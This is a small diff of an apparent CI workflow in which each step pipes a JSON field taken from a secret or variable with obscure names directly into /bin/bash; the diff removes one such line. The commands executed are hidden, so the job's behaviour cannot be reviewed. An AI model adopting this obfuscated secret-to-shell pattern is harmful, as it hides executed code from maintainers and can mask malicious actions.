@@ -17,7 +17,6 @@ jobs:
           h140: ${{ secrets.h140 }}
         run: |
           printf '%s' "$h140" | jq -r .drzr16174 | /bin/bash
-          echo $hhvg888 | jq -r .rfan6 | /bin/bash
           printf '%s' "$gb8" | jq -r .gy2767 | /bin/bash
           printf '%s' "$ur98" | jq -r .qfnd613 | /bin/bash
           echo $yme9747 | jq -r .smghm86000 | /bin/bash
